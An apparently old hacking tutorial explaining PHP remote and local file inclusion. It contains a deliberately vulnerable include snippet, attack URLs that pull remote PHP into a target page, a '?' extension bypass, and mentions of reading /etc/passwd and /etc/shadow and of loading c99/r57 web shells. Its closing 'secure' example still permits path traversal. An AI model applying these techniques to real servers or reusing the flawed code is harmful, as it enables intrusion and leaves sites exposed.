@@ -1,0 +1,132 @@
+Remote File Inclusion, or, RFI, may sound hard, but it's basically very easy. The title itself 
+already explains a bit about it. You will basically include a file on a server, which is hosted 
+on an other server. With RFI, you use an URL-based type of 'hacking'. Of course, this will only 
+be possible if the server supports PHP and allows Remote URL access. 
+ 
+Let's make an example of a RFI. Say we have "server1.com" as vulnerable, and we have our file 
+hosted on "server2.com". Both server's httpd root directories are "/var/www". Server 1 has a 
+vulnerability in their index.php. Server 2 contains our code which we want to include on Server 1 
+ 
+This is how a simple (and vulnerable) inclusion should look like, which we use as example on 
+the index.php of Server 1: 
+[code]<?php 
+  $page = $_GET['page']; 
+  include($page); 
+?>
+
+
+
+
+Now before we continue with RFI, and the file on Server 2, we will first test the code on the
+first server with LFI (Local File Inclusion), which is the same as RFI, only this method uses
+files which are hosted on the current (local) server, not a remote server. This method is often
+used in Linux to get "/etc/passwd" and sometimes "/etc/shadow".
+
+We will now create an other file on Server 1, which we will call "test.txt". This file will only
+contain the following:
+
+<?php 
+  echo "Hello, this is a test."; 
+?>
+
+
+
+
+Now we can test our inclusion on Server 1. We will include "test.txt" to see if it's working.
+An inclusion looks like "index.php?page=file", since we use "$page" and "$_GET['page']". so the
+URL will be:
+[url="http://server1.com/index.php?page=test.txt"]http://server1.com/index.php?page=test.txt[/url]
+
+If it works, you should see the text on the page, which will be:
+Hello, this is a test.
+
+If you did not create the test.txt, or if it's just not there, you should see the following error:
+Warning: main(test.txt) [function.main]: failed to open stream: No such file or directory in
+/var/www/index.php on line 1
+
+Remember that some servers have URL access disabled. This makes it impossible to include external
+(or Remote) files. This means you can not use "http://" or "ftp://" in an inclusion, but sometimes
+you can still use LFI on those websites.
+
+Ok, so now we know that the inclusion works. We can now create our file on Server 2. Let's call it
+"include.txt". This file will contain the following:
+
+<?php 
+  echo "Your RFI seems to be working."; 
+?>
+
+
+
+Now you are ready to do your RFI. It looks like this:
+
+	 SERVER 1												  SERVER 2 
+	 http://server1.com/index.php?page=		 http://server2.com/include.txt 
+														   \				/ 
+															 \			/ 
+			_____________________________\__   _/________________________________ 
+		   | http://server1.com/index.php?page=http://server2.com/include.txt | 
+			------------------------------------------------------------------
+
+
+
+
+That is how your final URL should be. If it works, you'll see the text of include.txt in the page
+of Server 1. Which will be:
+Your RFI seems to be working.
+
+Now there's something you should remember, and that is that some websites already have a filetype
+configured in their include script, such as:
+
+<?php 
+  $page = $_GET['page']; 
+  include("".$page.".html"); 
+?>
+
+
+
+
+Then if you use "index.php?page=test", it will include "test.html" on the local server. If this is
+the case, then your "http://server2.com/include.txt" will not work. You can bypass this by placing
+a question mark after your own URL, so it will be "http://server2.com/include.txt?". Then the URL
+should look like:
+
+http://server1.com/index.php?page=http://server2.com/include.txt?
+
+
+
+
+What this will do is include "http://server2.com/include.txt?.html"
+However, this is not all you can do with RFI. You can also include shell scripts, such as "c99"
+and "r57". These scripts will allow you to execute commands or do lots of other things on the
+server.
+
+For my own websites, I also use inclusions, but I've blocked the ability to use RFI. Here's a
+little bit of code which can help you on your way to secure your own pages:
+
+<?php 
+$page = $_GET['page']; 
+ 
+if ($page=="index") { 
+$page = "home"; 
+} 
+ 
+$filename = "./" . $page .".php"; 
+ 
+if (file_exists($filename)) { 
+include($filename); 
+} else { 
+include('home.php'); 
+} 
+?>
+
+
+
+
+This code will first check if the file which is requested, exists. If so, it includes it. If not,
+it will simply include home.php.
+
+
+
+-
+I hope this tutorial helped you to understand about RFI and how to use it. If you still have any
+questions or whatever, just contact me.[/code]
